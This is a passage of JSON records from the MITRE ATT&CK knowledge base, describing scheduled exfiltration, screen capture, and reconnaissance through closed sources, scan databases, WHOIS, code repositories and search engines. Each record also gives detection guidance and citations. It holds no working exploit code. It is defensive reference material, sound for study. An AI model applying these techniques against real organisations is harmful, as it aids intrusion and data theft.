systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAudit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.(Citation: archlinux Systemd Timers Aug 2020)","platforms":"Linux","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation","is sub-technique":true,"sub-technique of":"T1053","defenses bypassed":null,"contributors":"SarathKumar Rajendran, Trimble Inc","permissions required":"root, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1029","name":"Scheduled Transfer","description":"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).","url":"https://attack.mitre.org/techniques/T1029","created":"31 May 2017","last modified":"28 March 2020","version":"1.1","tactics":"Exfiltration","detection":"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Sednit Part 2),(Citation: Microsoft PLATINUM April 2016),(Citation: Unit 42 Kazuar May 2017),(Citation: Talos TinyTurla September 2021),(Citation: cobaltstrike manual),(Citation: ClearSky Siamesekitten August 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Machete July 2019),(Citation: ESET ComRAT May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Securelist ShadowPad Aug 2017),(Citation: Kaspersky Adwind Feb 2016),(Citation: ESET LightNeuron May 2019),(Citation: PTSecurity Higaisa 2020),(Citation: ESET Gelsemium June 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: Symantec Linfo May 2012),(Citation: University of Birmingham C2)"}
{"ID":"T1113","name":"Screen Capture","description":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n","url":"https://attack.mitre.org/techniques/T1113","created":"31 May 2017","last modified":"30 March 2023","version":"1.1","tactics":"Collection","detection":"Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: XAgentOSX 2017),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: GitHub Sliver Screen),(Citation: FireEye APT33 Sept 2017),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Talos Konni May 2017),(Citation: Securelist MuddyWater Oct 2018),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: NCCGroup RokRat Nov 2018),(Citation: Riskiq Remcos Jan 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Korean FSI TA505 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: Symantec Catchamas April 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: Talos Agent Tesla Oct 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Threatpost Lizar May 2021),(Citation: objsee mac malware 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Talos Seduploader Oct 2017),(Citation: Github PowerShell Empire),(Citation: Fortinet Agent Tesla June 2017),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Janicab),(Citation: SecureList Silence Nov 2017),(Citation: FireEye APT37 Feb 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Microsoft Actinium February 2022),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: KISA Operation Muzabi),(Citation: ESET Casbaneiro Oct 2019),(Citation: Profero APT27 December 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Bitdefender Agent Tesla April 2020),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Mandiant APT1 Appendix),(Citation: Zscaler Kasidet),(Citation: Trend Micro Muddy Water March 2021),(Citation: Symantec Hydraq Jan 2010),(Citation: Talos ROKRAT),(Citation: ClearSky Wilted Tulip July 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Secureworks Karagany July 2019),(Citation: Symantec Dragonfly Sept 2017),(Citation: Dragos Threat Report 2020),(Citation: TrendMicro BlackTech June 2017),(Citation: Cybereason Valak May 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Forcepoint Monsoon),(Citation: FireEye NETWIRE March 2019),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye FIN7 April 2017),(Citation: Unit42 Sofacy Dec 2018),(Citation: CIRCL PlugX March 2013),(Citation: jRAT Symantec Aug 2018),(Citation: Bitdefender Naikon April 2021),(Citation: Palo Alto Rover),(Citation: Red Canary NETWIRE January 2020),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Trend Micro Tick November 2019),(Citation: Proofpoint NETWIRE December 2020),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: GitHub PowerSploit May 2012),(Citation: DOJ FIN7 Aug 2018),(Citation: Symantec Chafer February 2018),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Securelist Remexi Jan 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Anomali Static Kitten February 2021),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Unit 42 Nokki Oct 2018),(Citation: FireEye APT10 April 2017),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Talos Oblique RAT March 2021),(Citation: Cybereason Molerats Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: CISA EB Aug 2020),(Citation: f-secure janicab),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: McAfee Netwire Mar 2015),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Radware Micropsia July 2018),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Palo Alto T9000 Feb 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: CopyKittens Nov 2015),(Citation: Securelist Octopus Oct 2018),(Citation: Accenture Hogfish April 2018),(Citation: Nccgroup Gh0st April 2018),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Security Affairs DustSquad Oct 2018),(Citation: FireEye APT41 Aug 2019),(Citation: SecureList Griffon May 2019),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: CheckPoint Bandook Nov 2020),(Citation: FinFisher Citation),(Citation: ESET Attor Oct 2019),(Citation: Prevx Carberp March 2011),(Citation: Kaspersky StoneDrill 2017),(Citation: CISA Zebrocy Oct 2020),(Citation: ESET Zebrocy May 2019),(Citation: ASERT Donot March 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: Kaspersky Flame),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Cylance Dust Storm),(Citation: Securelist ScarCruft May 2019),(Citation: Fortinet Agent Tesla April 2018),(Citation: FireEye Periscope March 2018),(Citation: F-Secure Cosmicduke),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Cylance Machete Mar 2017),(Citation: Unit42 RDAT July 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Malwarebytes Kimsuky June 2021),(Citation: 360 Machete Sep 2020),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET InvisiMole June 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit 42 Playbook Dec 2017),(Citation: FireEye Metamorfo Apr 2018),(Citation: Unit42 Redaman January 2019),(Citation: Talos ROKRAT 2),(Citation: Trend Micro Daserf Nov 2017),(Citation: US-CERT TA18-074A),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: Securelist Machete Aug 2014),(Citation: PWC KeyBoys Feb 2017),(Citation: BiZone Lizar May 2021),(Citation: ESET Operation Groundbait),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Citizen Lab Group5),(Citation: PowerSploit Documentation),(Citation: Objective-See MacMa Nov 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET RTM Feb 2017),(Citation: Gigamon Berserk Bear October 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Zscaler Cobian Aug 2017),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: cobaltstrike manual),(Citation: Talos PoetRAT April 2020),(Citation: Cylance Cleaver),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro njRAT 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: FireEye CARBANAK June 2017),(Citation: Symantec Chafer Dec 2015),(Citation: GitHub Pupy),"}
{"ID":"T1597","name":"Search Closed Sources","description":"Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","url":"https://attack.mitre.org/techniques/T1597","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Google EXOTIC LILY March 2022),"}
{"ID":"T1597.002","name":"Search Closed Sources: Purchase Technical Data","description":"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","url":"https://attack.mitre.org/techniques/T1597/002","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1597","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1597.001","name":"Search Closed Sources: Threat Intel Vendors","description":"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1597/001","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1597","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1596","name":"Search Open Technical Databases","description":"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1596","created":"02 October 2020","last modified":"18 October 2022","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1596.004","name":"Search Open Technical Databases: CDNs","description":"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).","url":"https://attack.mitre.org/techniques/T1596/004","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1596","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1596.001","name":"Search Open Technical Databases: DNS/Passive DNS","description":"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1596/001","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1596","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1596.003","name":"Search Open Technical Databases: Digital Certificates","description":"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1596/003","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1596","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1596.005","name":"Search Open Technical Databases: Scan Databases","description":"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","url":"https://attack.mitre.org/techniques/T1596/005","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1596","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1596.002","name":"Search Open Technical Databases: WHOIS","description":"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1596/002","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1596","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1593","name":"Search Open Websites/Domains","description":"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).","url":"https://attack.mitre.org/techniques/T1593","created":"02 October 2020","last modified":"18 October 2022","version":"1.1","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),"}
{"ID":"T1593.003","name":"Search Open Websites/Domains: Code Repositories","description":"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). \n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ","url":"https://attack.mitre.org/techniques/T1593/003","created":"09 August 2022","last modified":"26 October 2022","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1593","defenses bypassed":null,"contributors":"Matt Burrough, @mattburrough, Microsoft; Vinayak Wadhwa, SAFE Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1593.002","name":"Search Open Websites/Domains: Search Engines","description":"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).","url":"https://attack.mitre.org/techniques/T1593/002","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1593","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: KISA Operation Muzabi),"}
{"ID":"T1593.001","name":"Search Open Websites/Domains: Social Media","description":"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via 